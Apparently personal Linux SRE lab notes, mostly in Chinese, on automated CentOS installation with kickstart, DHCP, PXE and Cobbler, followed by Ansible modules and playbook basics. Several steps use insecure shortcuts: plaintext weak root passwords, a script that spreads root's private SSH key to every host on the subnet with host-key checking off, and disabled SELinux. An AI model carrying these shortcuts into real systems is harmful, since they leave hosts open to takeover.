lang en_US.UTF-8
network  --bootproto=dhcp --device=eth0 --ipv6=auto --activate
bootloader --append="net.ifnames=0" --location=mbr --boot-drive=sda
rootpw --plaintext 123456
network  --hostname=centos8.liuawnbiao.org
firstboot --enable
skipx
services --disabled="chronyd"
timezone Asia/Shanghai --isUtc --nontp
user --name=liu --
rootpw --plaintext 123456
#autopart --type=lvm
#part / --fstype xfs --size 1 --grow --ondisk sda 可以实现根自动使用所有剩余空
间
part / --fstype="xfs" --ondisk=sda --size=102400
part /data --fstype="xfs" --ondisk=sda --size=51200
part swap --fstype="swap" --ondisk=sda --size=2048
part /boot --fstype="ext4" --ondisk=sda --size=1024
%packages
@^minimal-environment
kexec-tools
%end
%addon com_redhat_kdump --enable --reserve-mb='auto'
%end
%anaconda
pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty
pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok
pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty
%end

[22:10:25 root@centos7 html]#mkdir ks
要保证应答文件能够访问
[22:51:44 root@liu ~]#cp ks7.cfg /var/www/html/ks/centos7.cfg
#centos8作为应答文件的存放路径
```

![1652192191364](linuxSRE.assets/1652192191364.png)

```
创建新的虚拟机 要找个Netinstall的镜像，大约600M左右
进入类似于救援模式下面，按ESC键
boot: linux ks=http://10.0.0.8/ks/centos7.cfg
```

![1652192529043](linuxSRE.assets/1652192529043.png)

#### 31.1.2实现DHCP服务

```
先禁用VMware中的DHCP
```

![1652232103860](linuxSRE.assets/1652232103860.png)

```
[09:23:09 root@liu ~]#yum -y install dhcp
[09:23:19 root@liu ~]# rpm -ql dhcp
#这个时候你会发现服务启动不起来
[09:26:58 root@liu ~]# systemctl enable --now dhcpd 
#查看日记看出错情况
[09:26:58 root@liu ~]#cat /var/log/messages
```

![1652232664045](linuxSRE.assets/1652232664045.png)

```
[09:26:58 root@liu ~]#vim /etc/dhcp/dhcpd.conf 
#发现里面都是注释
# see /usr/share/doc/dhcp*/dhcpd.conf.example
#于是把范例的文件拷过来覆盖
[09:44:33 root@liu ~]#cp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.conf
[09:48:38 root@liu ~]#vim /etc/dhcp/dhcpd.conf
#把subnet原网段的的范例地址改成你自己定义网段的地址
subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.150 10.0.0.180;
  option routers 10.0.0.2;  #你的路由地址
}
option domain-name-servers 180.76.76.76, 223.5.5.5;

default-lease-time 86400;
max-lease-time 106400;
#如果你想要别的主机每次都获取dhcp上固定的ip
# Fixed IP addresses can also be specified for hosts.   These addresses下面设置
host testhost {
   hardware ethernet 00:0c:29:92:5c:c8;#别的主机mac地址
   fixed-address 10.0.0.123;#每次要求分配的固定ip
}

#重启服务发现成功了
[09:48:00 root@liu ~]# systemctl enable --now dhcpd
#查看谁从我这里获取了dhcp地址
[10:57:17 root@liu dhcpd]#cat /var/lib/dhcpd/dhcpd.leases
```

![1652238541315](linuxSRE.assets/1652238541315.png)

**每次从dhcp中获得固定的ip**

![1652240493302](linuxSRE.assets/1652240493302.png)

#### 31.1.3实现TFTP服务

```
#服务器端centos7
[11:59:24 root@liu ~]#yum -y install tftp-server
[12:22:22 root@liu ~]#vim /etc/dhcp/dhcpd.conf
# dhcpd.conf
# Sample configuration file for ISC dhcpd
#
# option definitions common to all supported networks...
option domain-name "example.org";
option domain-name-servers 180.76.76.76, 223.5.5.5;

default-lease-time 86400;
max-lease-time 106400;

# Use this to enble / disable dynamic dns updates globally.
#ddns-update-style none;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
#authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# No service will be given on this subnet, but declaring it helps the 
# DHCP server to understand the network topology.

subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.150 10.0.0.180;
    option routers 10.0.0.2;
    next-server 10.0.0.7; #TFTP服务器
    filename "pxelinux.0"; #类似于实现grub的功能
}

#客户端我用的ubuntu
[12:03:23 liu@ubuntu1804 ~]$sudo apt install tftp
[12:06:17 liu@ubuntu1804 ~]$tftp 10.0.0.7 #连接需要下载的文件的服务器
```

#### 31.1.4PXE自动化系统部署

**pxe启动工作原理**

![1652259822135](linuxSRE.assets/1652259822135.png)

```
关闭防火墙和SELINUX，DHCP服务器静态IP
网络要求：关闭Vmware软件中的DHCP服务
[11:59:24 root@liu ~]#yum -y install httpd tftp-server dhcp syslinux system-config-kickstart
[19:17:07 root@liu ~]#cd /var/lib/tftpboot/
[19:19:09 root@liu tftpboot]#cp /usr/share/syslinux/pxelinux.0 /usr/share/syslinux/menu.c32 .
#接下来要在VMare上添加一个CD光盘，用的是centos8的iso文件
#然后进行挂载，目的就是为了客户端文件可以直接连上去下载各类包
[20:44:43 root@liu ~]#mount /dev/sr0 /var/www/html/centos/7/os/x86_64/
[20:44:43 root@liu ~]#mount /dev/sr1 /var/www/html/centos/8/os/x86_64/
[23:55:32 root@liu tftpboot]#mkdir centos{7,8}
[20:41:35 root@liu tftpboot]#cp /var/www/html/centos/8/os/x86_64/isolinux/{vmlinuz,initrd.img} centos8/  #配置内核和虚拟文件系统
[20:41:39 root@liu tftpboot]#cp /var/www/html/centos/7/os/x86_64/isolinux/{vmlinuz,initrd.img} centos7/ #配置内核和虚拟文件系统
[20:42:01 root@liu tftpboot]#tree
.
├── centos7
│   ├── initrd.img
│   └── vmlinuz
├── centos8
│   ├── initrd.img
│   └── vmlinuz
├── menu.c32
└── pxelinux.0
[20:42:06 root@liu tftpboot]#cp /var/www/html/centos/8/os/x86_64/isolinux/{ldlinux.c32,libcom32.c32,libutil.c32} . #centos8才有的文件
[21:07:05 root@liu tftpboot]#ls
centos7  centos8  ldlinux.c32  libcom32.c32  libutil.c32  menu.c32  pxelinux.0

#还差一个菜单
[21:08:56 root@liu tftpboot]#mkdir pxelinux.cfg
[21:11:27 root@liu tftpboot]#cp /var/www/html/centos/7/os/x86_64/isolinux/isolinux.cfg pxelinux.cfg/default
[21:27:08 root@liu tftpboot]#vim pxelinux.cfg/default
default menu.c32
timeout 600 
menu title Install CentOS Linux
 
label linux8
 menu label Auto Install CentOS Linux ^8
 kernel centos8/vmlinuz
 append initrd=centos8/initrd.img ks=http://10.0.0.7/ks/centos8.cfg
  
label linux7
 menu label Auto Install CentOS Linux ^7  
 kernel centos7/vmlinuz
 append initrd=centos7/initrd.img ks=http://10.0.0.7/ks/centos7.cfg
  
label manual
 menu label ^Manual Install CentOS Linux 8.0 
 kernel centos8/vmlinuz
 append initrd=centos8/initrd.img ks=http://10.0.0.7/centos/8/os/x86_64/

label rescue
 menu label ^Rescue a CentOS Linux system 8
 kernel centos8/vmlinuz
 append initrd=centos8/initrd.img ks=http://10.0.0.7/centos/8/os/x86_64/  rescue
 
label local
 menu default
 menu label Boot from ^local drive
 localboot 0xffff
:%s/100/7/g :表示全局替换，把100换成7

[21:37:01 root@liu tftpboot]#tree
├── centos7
│   ├── initrd.img
│   └── vmlinuz
├── centos8
│   ├── initrd.img
│   └── vmlinuz
├── ldlinux.c32
├── libcom32.c32
├── libutil.c32
├── menu.c32
├── pxelinux.0
└── pxelinux.cfg
    └── default
    
[21:42:32 root@liu ~]#systemctl restart dhcpd httpd tftp
#自动化安装的时候会出现如下错误
#valueerror new value non-existent xfs filesystem is not valid as a default fs type
解决方法：
这个是由于使用的initrd.img 和 vmlinuz 版本 与 将要安装的iso镜像不匹配导致的。
我的原因就是mount挂载的时候挂载错了，重新挂载下就行了
```

![1652280942540](linuxSRE.assets/1652280942540.png)

![1652280026401](linuxSRE.assets/1652280026401.png)

![1652280169758](linuxSRE.assets/1652280169758.png)

**按b进行自动化安装**

![1652281821556](linuxSRE.assets/1652281821556.png)

**接下来都是自动化安装**

![1652282979532](linuxSRE.assets/1652282979532.png)

#### 31.1.5Cobbler自动化安装

**Cobbler的工作原理**

![1652284810508](linuxSRE.assets/1652284810508.png)

```
实战案例：CentOS 7 基于cobbler实现系统的自动化安装
[14:26:06 root@liu ~]#yum install cobbler dhcp -y
[14:27:55 root@liu ~]#systemctl enable --now cobblerd httpd tftp dhcpd
[14:58:50 root@liu ~]#cobbler check
#其中会出现httpd does not appear to be running and proxying cobbler, or SELinux is in the way. Original traceback错误
#解决办法：[14:59:06 root@liu ~]#systemctl restart httpd

[14:58:50 root@liu ~]#cobbler check
The following are potential configuration items that you may want to fix:

1 : The 'server' field in /etc/cobbler/settings must be set to something other than localhost, or kickstarting features will not work.  This should be a resolvable hostname or IP for the boot server as reachable by all machines that will use it.
2 : For PXE to be functional, the 'next_server' field in /etc/cobbler/settings must be set to something other than 127.0.0.1, and should match the IP of the boot server on the PXE network.
3 : change 'disable' to 'no' in /etc/xinetd.d/tftp
4 : Some network boot-loaders are missing from /var/lib/cobbler/loaders.  If you only want to handle x86/x86_64 netbooting, you may ensure that you have installed a *recent* version of the syslinux package installed and can ignore this message entirely.  Files in this directory, should you want to support all architectures, should include pxelinux.0, menu.c32, elilo.efi, and yaboot.
5 : enable and start rsyncd.service with systemctl
6 : debmirror package is not installed, it will be required to manage debian deployments and repositories
7 : ksvalidator was not found, install pykickstart
8 : The default password used by the sample templates for newly installed machines (default_password_crypted in /etc/cobbler/settings) is still set to 'cobbler' and should be changed, try: "openssl passwd -1 -salt 'random-phrase-here' 'your-password-here'" to generate new one
9 : fencing tools were not found, and are required to use the (optional) power management features. install cman or fence-agents to use them

Restart cobblerd and then run 'cobbler sync' to apply changes

[15:02:45 root@liu ~]#vim /etc/cobbler/settings
按住esc键/127.0.0.1 
在390行改成server: 10.0.0.7
在278行改成 next_server: 10.0.0.7 #tftp服务器地址
在242行改成manage_dhcp: 1
[15:19:44 root@liu ~]#openssl passwd -1 123456
$1$.O78iwPr$HoxHAgeMo7BSWXXz2IWEq/
在101行改成自己生产的密码default_password_crypted: "$1$.O78iwPr$HoxHAgeMo7BSWXXz2IWEq/"
[15:23:33 root@liu ~]#systemctl restart cobblerd.service
[16:35:14 root@liu ~]#cobbler get-loaders
[16:55:27 root@liu ~]#cobbler sync
[16:57:44 root@liu ~]#tree /var/lib/tftpboot/
/var/lib/tftpboot/
├── boot
│   └── grub
│       └── menu.lst
├── etc
├── grub
│   ├── efidefault
│   ├── grub-x86_64.efi
│   ├── grub-x86.efi
│   └── images -> ../images
├── images
├── images2
├── memdisk
├── menu.c32
├── ppc
├── pxelinux.0
├── pxelinux.cfg
│   └── default
└── s390x
│  └── profile_list
├── yaboot
10 directories,10 files
[16:58:46 root@liu ~]#vim /etc/cobbler/dhcp.template
#修改以下内容
subnet 10.0.0.0 netmask 255.255.255.0 {
       option routers             10.0.0.2;
       option domain-name-servers 180.76.76.76;
       option subnet-mask         255.255.255.0;
       range dynamic-bootp        10.0.0.120 10.0.0.254;
[17:08:16 root@liu ~]#cobbler sync #自动生成dhcp配置文件
[17:11:08 root@liu ~]#vim /etc/dhcp/dhcpd.conf #看一下生成的dhcp文件
[17:12:43 root@liu ~]#vim /etc/cobbler/pxe/pxedefault.template #这个是用来改菜单上的公司名
MENU TITLE Cobbler | http://www.liusenbiao.com

#导入CentOS系统的安装文件，生成相应的YUM源
[17:22:42 root@liu ~]#cobbler import --name=centos-7.9-x86_64 --path=/misc/cd --arch=x86_64 #导入centos7.9版本
在VMware里面添加centos8.2的CD光盘
[17:31:15 root@liu ~]#mount /dev/sr1 /mnt/
[17:31:39 root@liu ~]#cobbler import --name=centos-8.2-x86_64 --path=/mnt --arch=x86_64 #导入centos8.2版本
[18:05:27 root@liu ~]#du -sh /var/www/cobbler/ks_mirror/*
9.6G	/var/www/cobbler/ks_mirror/centos-7.9-x86_64
9.6G	/var/www/cobbler/ks_mirror/centos-8.1-x86_64
9.6G	/var/www/cobbler/ks_mirror/centos-8.3-x86_64
```

![1652348988653](linuxSRE.assets/1652348988653.png)

```
 支持UEFI安装
 新建虚拟机,一路下一步，只需要改一个磁盘容量大小
[17:35:20 root@liu ~]#vim /etc/cobbler/pxe/efidefault.template
 timeout=100 只要改这个就行
[18:27:34 root@liu ~]#cobbler sync
#验证生效
[19:00:51 root@liu ~]#head -n 2 /var/lib/tftpboot/grub/efidefault
default=0
timeout=100
[19:29:13 root@liu ~]#vim centos7.cfg
把第29行的url --url=$tree改成这个
[19:29:13 root@liu ~]#vim centos8.cfg
把url --url=$tree改成这个
[19:35:12 root@liu ~]#systemctl restart cobblerd
[19:36:25 root@liu ~]#cobbler sync
[19:36:39 root@liu ~]#cobbler distro list
   centos-7.9-x86_64
   centos-8.1-x86_64
   centos-8.3-x86_64
```

![1652350494521](linuxSRE.assets/1652350494521.png)

![1652350603229](linuxSRE.assets/1652350603229.png)

![1652350670893](linuxSRE.assets/1652350670893.png)

![1652355662912](linuxSRE.assets/1652355662912.png)

```
准备 kickstart文件,并关联至指定的YUM源
[19:37:39 root@liu ~]#cp centos7.cfg  /var/lib/cobbler/kickstarts/
[19:42:06 root@liu ~]#ll /var/lib/cobbler/kickstarts/
#将kickstart文件，关联指定的YUM源和生成菜单列表
[19:45:41 root@liu ~]#cobbler profile add --name=CentOS-7.9_mini --distro=CentOS-7.9-x86_64 --kickstart=/var/lib/cobbler/kickstarts/centos7.cfg
[19:43:40 root@liu ~]#cobbler profile add --name=CentOS-8.3_mini --distro=CentOS-8.3-x86_64 --kickstart=/var/lib/cobbler/kickstarts/centos8.cfg
#删除到你指定想要安装的菜单
[19:47:38 root@liu ~]#cobbler profile remove --name=centos-8.1-x86_64
[19:48:48 root@liu ~]#cobbler profile remove --name=centos-8.3-x86_64
[19:48:59 root@liu ~]#cobbler profile remove --name=centos-7.9-x86_64
```

![1652356258182](linuxSRE.assets/1652356258182.png)

```
实现cobbler 的web管理
[19:49:17 root@liu ~]#yum -y install cobbler-web
[19:56:48 root@liu ~]#systemctl restart httpd
浏览器登录https://10.0.0.7/cobbler_web/ksfile/list
账户密码都是默认的cobbler
#设置新的用户名密码
[20:00:18 root@liu ~]#htdigest -c /etc/cobbler/users.digest 
```

![1652357271921](linuxSRE.assets/1652357271921.png)

### 31.2ANSIBLE部署

#### 31.2.1inventory配置说明

![1653990796001](linuxSRE.assets/1653990796001.png)

#### 31.2.2Ansible测试连接

```
#1.安装ansible
[23:51:35 root@ansible ~]# yum install ansible -y


#2.修改配置文件
[23:51:35 root@ansible ~]# vim /etc/ansible/hosts
#最后一行添加上需要管理的机器
[local]
10.0.0.57 ansible_connection=local #管理自己的本机

[websrvs]
10.0.0.7
10.0.0.18

[dbsrvs]
10.0.0.17
10.0.0.18

[appsrvs]
10.0.0.7
10.0.0.8
10.0.0.48


#3.实现多台主机基于key验证脚本
[23:51:35 root@ansible ~]# vim ssh_key.sh
#!/bin/bash
#
#*********************************************
#Author:            liusenbiao
#Description：      基于key验证多主机ssh访问
#Date:              2021-03-31
#*********************************************

PASS=123456
#设置网段最后的地址，4-255之间，越小扫描越快
END=254

IP=`ip a s eth0 | awk -F'[ /]+' 'NR==3{print $3}'`
NET=${IP%.*}.

rm -f /root/.ssh/id_rsa
[ -e ./SCANIP.log ] && rm -f SCANIP.log
for((i=3;i<="$END";i++));do
ping -c 1 -w 1  ${NET}$i &> /dev/null  && echo "${NET}$i" >> SCANIP.log &
done
wait

ssh-keygen -P "" -f /root/.ssh/id_rsa
rpm -q sshpass || yum -y install sshpass
sshpass -p $PASS ssh-copy-id -o StrictHostKeyChecking=no $IP 

AliveIP=(`cat SCANIP.log`)
for n in ${AliveIP[*]};do
sshpass -p $PASS scp -o StrictHostKeyChecking=no -r /root/.ssh root@${n}:
done

#把.ssh/known_hosts拷贝到所有主机，使它们第一次互相访问时不需要输入回车
for n in ${AliveIP[*]};do
scp /root/.ssh/known_hosts ${n}:.ssh/
done
[23:51:35 root@ansible ~]#bash ssh_key.sh
##已经实现key验证的主机
[23:23:05 root@centos7 ~]#cat SCANIP.log
10.0.0.18
10.0.0.57
10.0.0.8
10.0.0.48
10.0.0.17



#4.管理所有的远程主机
[23:54:45 root@ansible ~]#ansible all --list-hosts
#查看一共需要被管理的机器
hosts (5):
10.0.0.18
10.0.0.8
10.0.0.48
10.0.0.17
10.0.0.57
[23:54:46 root@ansible ~]#ansible all -m ping
-m:表示模块
这条命令表示测试能否控制远程主机
#出现以下表示成功
10.0.0.48 | SUCCESS => {
    "ansible_facts": {
        "discovered_interpreter_python": "/usr/libexec/platform-python"
    }, 
    "changed": false, 
    "ping": "pong"
}
```

#### 31.2.3Ansible相关工具

```
#1.ansible相关功能
/usr/bin/ansible 主程序，临时命令执行工具
/usr/bin/ansible-doc 查看配置文档，模块功能查看工具,相当于man 
/usr/bin/ansible-playbook 定制自动化任务，编排剧本工具,相当于脚本
/usr/bin/ansible-pull 远程执行命令的工具
/usr/bin/ansible-vault 文件加密工具
/usr/bin/ansible-console 基于Console界面与用户交互的执行工具
/usr/bin/ansible-galaxy 下载/上传优秀代码或Roles模块的官网平台



#2.ansible选项说明
--version #显示版本
-m module   #指定模块，默认为command
-v #详细过程 –vv -vvv更详细
--list-hosts #显示主机列表，可简写 --list
-C, --check   #检查，并不执行
-T, --timeout=TIMEOUT #执行命令的超时时间，默认10s
-k, --ask-pass     #提示输入ssh连接密码，默认Key验证 
-u, --user=REMOTE_USER #执行远程执行的用户
-b, --become    #代替旧版的sudo 切换
--become-user=USERNAME  #指定sudo的runas用户，默认为root
-K, --ask-become-pass  #提示输入sudo时的口令



#3.ansible命令执行过程
1. 加载自己的配置文件,默认/etc/ansible/ansible.cfg
2. 加载自己对应的模块文件，如：command
3. 通过ansible将模块或命令生成对应的临时py文件，并将该文件传输至远程服务器的对应执行用户
$HOME/.ansible/tmp/ansible-tmp-数字/XXX.PY文件
4. 给文件+x执行
5. 执行并返回结果
6. 删除临时py文件，退出
```

#### 31.2.4Ansible常用模块

```
#0.官方文档
https://docs.ansible.com/ansible/2.9/modules/modules_by_category.html



#1.Command 模块
功能：在远程主机执行命令，此为默认模块，可忽略-m选项
不支持幂等性

[10:19:55 root@ansible ~]#ansible websrvs -m command -a 'hostname'
#command后面跟命令
10.0.0.17 | CHANGED | rc=0 >>
pxc2
10.0.0.18 | CHANGED | rc=0 >>
slave1.liusenbiao.org
[10:21:15 root@ansible ~]#ansible websrvs -a 'ls -l /data/ansible.log'
10.0.0.17 | CHANGED | rc=0 >>
-rw-r--r-- 1 root root 0 Jun  1 10:21 /data/ansible.log
10.0.0.18 | CHANGED | rc=0 >>
-rw-r--r-- 1 root root 0 Jun  1 10:21 /data/ansible.log

#creates创建文件夹，如果存在则执行后续命令
[10:33:01 root@ansible ~]#ansible websrvs -m command -a 'creates=/data/mysql mkdir /data/mysql'
[WARNING]: Consider using the file module with state=directory rather than
running 'mkdir'.  If you need to use command because file is insufficient you
can add 'warn: false' to this command task or set 'command_warnings=False' in
ansible.cfg to get rid of this message.
10.0.0.17 | CHANGED | rc=0 >>

10.0.0.18 | SUCCESS | rc=0 >>
skipped, since /data/mysql exists



#2.Shell模块
功能：和command相似，用shell执行命令,支持各种符号,比如:*,$, >
不支持幂等性
注意：调用bash执行命令 类似 cat /tmp/test.md | awk -F'|' '{print $1,$2}' &> /tmp/example.txt 这
些复杂命令，即使使用shell也可能会失败
#2.1把shell模块改成默认模块
[10:33:19 root@ansible ~]#vim /etc/ansible/ansible.cfg
第114行
# default module name for /usr/bin/ansible
module_name = shell
[10:57:36 root@ansible ~]#ansible websrvs -a 'echo $HOSTNAME'
10.0.0.17 | CHANGED | rc=0 >>
pxc2
10.0.0.18 | CHANGED | rc=0 >>
slave1.liusenbiao.org



#3.Script模块
功能：在远程主机上运行ansible服务器上的脚本(无需执行权限)

[11:08:34 root@ansible ~]#ansible websrvs -m script -a '/root/test.sh'



#4.Copy模块
功能：从ansible服务器主控端复制文件到远程主机

#把本地文件的属性所有组上传到远程机器中
[14:38:35 root@ansible ~]#ansible  websrvs -m copy -a 'src=ssh_key.sh dest=/data/ssh.key owner=liu group=bin mode=700'	

#拷贝文件夹,加/表示复制/etc目录自身,注意/etc/后面没有/
#不加/表示文件夹里面的内容
#注意速度非常慢，只适用于拷贝小的配置文件
[14:41:32 root@ansible ~]#ansible websrvs -m copy -a "src=/etc dest=/backup"



#5.Get_url模块
功能：将文件从http,https,或者ftp下载到被管理机节点上

url:下我文件的URL，支持HTTP，HTTPS或FTP协议
dest:下载到目标路径(绝对路径)，如果目标是一个目录，就用服务器上面文件的名称，如果目标设置了名称就用目标设置的名称 owner:指定属主
group:指定属组
mode:指定权限
force:如果yes，dest不是目录，将每次下载文件，如果内容改变，替换文件。如果否，则只有在目标不存在时才会下载该文件 checksum: 对目标文件在下载后计算摘要，以确保其完整性
示例:checksum="sha256:D98291AC[...]B6DC7B97"
checksum="sha256:http://example.com/path/sha256sum.txt"
ur1_username:用于HTTP基本认证的用户名。对于允许空密码的站点，此参数可以不使用`ur1_password
ur1_password:用于HTTP基本认证的密码。如果未指定urusername参数，则不会使用ur1password参数
validate_certs:如果“no”，SSL证书将不会被验证。 适用于自签名证书在私有网站上使用
timeout:URL请求的超时时间，秒为单位

[14:59:23 root@ansible ~]#wget https://nginx.org/download/nginx-1.18.0.tar.gz
[14:59:23 root@ansible ~]#md5sum nginx-1.18.0.tar.gz 
b2d33d24d89b8b1f87ff5d251aa27eb8  nginx-1.18.0.tar.gz
[14:59:51 root@ansible ~]#ansible  websrvs -m get_url -a 'url=https://nginx.org/download/nginx-1.18.0.tar.gz dest=/usr/local/src/nginx.tar.gz checksum=md5:b2d33d24d89b8b1f87ff5d251aa27eb8'




#6.Fetch模块
功能：从远程主机提取文件至ansible的主控端，copy相反，目前不支持目录(日志居多)

#把远程主机的/var/log/messages拷贝到ansible控制端
[15:07:40 root@ansible ~]#ansible  websrvs -m fetch -a 'src=/var/log/messages dest=/data/log




#7.File模块
功能：设置文件属性,创建软链接等
#创建空文件
[15:18:14 root@ansible ~]# ansible all -m file -a 'path=/data/a.txt state=touch owner=root'
#删除文件
[15:18:14 root@ansible ~]# ansible all -m file -a 'path=/data/a.txt state=absent owner=root'
#创建目录
[15:18:14 root@ansible ~]# ansible all -m file -a "path=/data/mysql state=directory owner=mysql 
group=mysql"
#创建软链接
[15:18:14 root@ansible ~]# ansible all -m file -a 'src=/data/testfile path|dest|name=/data/testfile-link 
state=link'
#递归修改目录属性
[15:18:14 root@ansible ~]# ansible all -m file -a "path=/data/mysql state=directory owner=mysql group=mysql recurse=yes"




#8.unarchive 模块
功能：解包解压缩
实现有两种用法：
1、将ansible主机上的压缩包传到远程主机后解压缩至特定目录，设置copy=yes,此为默认值，可省略
2、将远程主机上的某个压缩包解压缩到指定路径下，设置copy=no


常见参数：
copy：默认为yes，当copy=yes，拷贝的文件是从ansible主机复制到远程主机上，如果设置为
copy=no，会在远程主机上寻找src源文件
remote_src：和copy功能一样且互斥，yes表示在远程主机，不在ansible主机，no表示文件在ansible
主机上
src：源路径，可以是ansible主机上的路径，也可以是远程主机(被管理端或者第三方主机)上的路径，如果
是远程主机上的路径，则需要设置copy=no
dest：远程主机上的目标路径
mode：设置解压缩后的文件权限


#把压缩文件解压到远程主机上
[15:45:19 root@ansible ~]#ansible all -m unarchive -a 'src=nginx-1.18.0.tar.gz dest=/usr/local/src owner=root group=bin'
#把互联网上的压缩包下载并解压到别的远程主机上
#copy=no表示ansible主机上没有这个压缩包
[15:49:48 root@ansible ~]#ansible all -m unarchive -a 'src=https://nginx.org/download/nginx-1.20.2.tar.gz dest=/data copy=no'
#把远程主机上的压缩包解压到本地主机上
[15:53:34 root@ansible ~]# ansible all -m unarchive -a 'src=/usr/local/src/nginx.tar.gz dest=/opt copy=no'



#9.Archive模块
功能：打包压缩保存在被管理节点
[15:53:34 root@ansible ~]# ansible websrvs -m archive  -a 'path=/var/log/ dest=/data/log.tar.bz2 format=bz2 
owner=wang mode=0600'



#10.Cron模块
功能：计划任务
支持时间：minute，hour，day，month，weekday


#备份数据库脚本
[root@centos8 ~]#cat /root/mysql_backup.sh 
#!/bin/bash
mysqldump -A -F --single-transaction --master-data=2 -q -uroot |gzip > 
/data/mysql_`date +%F_%T`.sql.gz
#创建任务
ansible 10.0.0.8 -m cron -a 'hour=2 minute=30 weekday=1-5 name="backup mysql" 
job=/root/mysql_backup.sh'
ansible websrvs   -m cron -a "minute=*/5 job='/usr/sbin/ntpdate ntp.aliyun.com 
&>/dev/null' name=Synctime"
#禁用计划任务
ansible websrvs   -m cron -a "minute=*/5 job='/usr/sbin/ntpdate 172.20.0.1 
&>/dev/null' name=Synctime disabled=yes"
#启用计划任务
ansible websrvs   -m cron -a "minute=*/5 job='/usr/sbin/ntpdate 172.20.0.1 
&>/dev/null' name=Synctime disabled=no"
#删除任务
ansible websrvs -m cron -a "name='backup mysql' state=absent"
ansible websrvs -m cron -a 'state=absent name=Synctime



#11.Yum和Apt模块
功能：
yum 管理软件包，只支持RHEL，CentOS，fedora，不支持Ubuntu其它版本
apt 模块管理 Debian 相关版本的软件包

[18:12:43 root@ansible ~]# ansible websrvs -m yum -a 'name=httpd state=present'  #安装
[18:12:43 root@ansible ~]# ansible websrvs -m yum -a 'name=httpd state=absent'   #删除
[18:12:43 root@ansible ~]# ansible 10.0.0.17 -m yum -a 'list=httpd'  #查看状态




#12.Service模块
功能：管理服务
[18:12:43 root@ansible ~]# ansible all -m service -a 'name=httpd state=started enabled=yes' #设置为开机启动
[18:12:43 root@ansible ~]# ansible all -m service -a 'name=httpd state=stopped'
[18:12:43 root@ansible ~]# ansible all -m service -a 'name=httpd state=reloaded'
[18:12:43 root@ansible ~]# ansible all -m shell -a "sed -i 's/^Listen 80/Listen 8080/' 
/etc/httpd/conf/httpd.conf"
[18:12:43 root@ansible ~]# ansible all -m service -a 'name=httpd state=restarted'



#13.User模块
功能：管理用户

#创建用户
[18:12:43 root@ansible ~]# ansible all -m user -a 'name=user1 comment="test user" uid=2048 home=/app/user1 
group=root'
[18:12:43 root@ansible ~]# ansible all -m user -a 'name=nginx comment=nginx uid=88 group=nginx 
groups="root,daemon" shell=/sbin/nologin system=yes create_home=no 
home=/data/nginx non_unique=yes'
#remove=yes表示删除用户及家目录等数据,默认remove=no
[18:12:43 root@ansible ~]# ansible all -m user -a 'name=nginx state=absent remove=yes'



#14.Group模块
功能：管理组
#创建组
[18:12:43 root@ansible ~]# ansible websrvs -m group  -a 'name=nginx gid=88 system=yes'
#删除组
[18:12:43 root@ansible ~]# ansible websrvs -m group  -a 'name=nginx state=absent



#15.Lineinfile模块
ansible在使用sed进行替换时，经常会遇到需要转义的问题，而且ansible在遇到特殊符号进行替换时，存在问题，无法正常进行替换 。其实在ansible自身提供了两个模块：lineinfile模块和replace模块，可以方便的进行替换
一般在ansible当中去修改某个文件的单行进行替换的时候需要使用lineinfile模块
regexp参数 ：使用正则表达式匹配对应的行，当替换文本时，如果有多行文本都能被匹配，则只有最后面被匹配到的那行文本才会被替换，当删除文本时，如果有多行文本都能被匹配，这么这些行都会被
删除。
如果想进行多行匹配进行替换需要使用replace模块
功能：相当于sed，可以修改文件内容


[18:12:43 root@ansible ~]# ansible websrvs -m lineinfile -a "path=/etc/httpd/conf/httpd.conf 
regexp='^Listen' line='Listen 80'"
[18:12:43 root@ansible ~]# ansible all -m   lineinfile -a "path=/etc/selinux/config regexp='^SELINUX=' 
line='SELINUX=disabled'"
[18:12:43 root@ansible ~]# ansible all -m lineinfile  -a 'dest=/etc/fstab state=absent regexp="^#"' #删除#号开头的行




#16.Replace模块
该模块有点类似于sed命令，主要也是基于正则进行匹配和替换，建议使用


[18:12:43 root@ansible ~]# ansible all -m replace -a "path=/etc/fstab regexp='^(UUID.*)' replace='#\1'"  
[18:12:43 root@ansible ~]# ansible all -m replace -a "path=/etc/fstab regexp='^#(UUID.*)' replace='\1'"



#17.SELinux模块
功能：该模块管理SELinux策略

#禁用SELinux
[09:13:52 root@ansible ~]#ansible all -m selinux -a 'state=disabled'


#18.reboot模块
[09:13:52 root@ansible ~]# ansible all -m reboot


19.Setup模块
功能： setup 模块来收集主机的系统信息，这些facts信息可以直接以变量的形式使用，但是如果主机较多，会影响执行速度，可以使用 gather_facts:no来禁止 Ansible 收集facts信息

ansible all -m setup
ansible all -m setup -a "filter=ansible_nodename"
ansible all -m setup -a "filter=ansible_hostname"
ansible all -m setup -a "filter=ansible_domain"
ansible all -m setup -a "filter=ansible_memtotal_mb" #内存总大小
ansible all -m setup -a "filter=ansible_memory_mb"
ansible all -m setup -a "filter=ansible_memfree_mb"
ansible all -m setup -a "filter=ansible_os_family" #ubuntu 
ansible all -m setup -a "filter=ansible_distribution_major_version" #操作系统版本
ansible all -m setup -a "filter=ansible_distribution_version"
ansible all -m setup -a "filter=ansible_processor_vcpus"
ansible all -m setup -a "filter=ansible_all_ipv4_addresses"
ansible all -m setup -a "filter=ansible_architecture"
ansible all -m setup -a "filter=ansible_processor
```

#### 31.2.5Playbook的使用

![1654134342594](linuxSRE.assets/1654134342594.png)

##### 31.2.5.1Playbook核心组件

```
#0.一个playbook 中由列表组成,其中所用到的常见组件类型如下
Hosts 执行的远程主机列表
Tasks 任务集,由多个task的元素组成的列表实现,每个task是一个字典,一个完整的代码块功能需最少元素需包括 name 和 task,一个name只能包括一个task
Variables 内置变量或自定义变量在playbook中调用
Templates 模板，可替换模板文件中的变量并实现一些简单逻辑的文件
Handlers 和 notify 结合使用，由特定条件触发的操作，满足条件方才执行，否则不执行
tags 标签 指定某条任务执行，用于选择运行playbook中的部分代码。ansible具有幂等性，因此会自动跳过没有变化的部分，即便如此，有些代码为测试其确实没有发生变化的时间依然会非常地长。此时，如果确信其没有变化，就可以通过tags跳过此些代码片断



#1.hosts组件
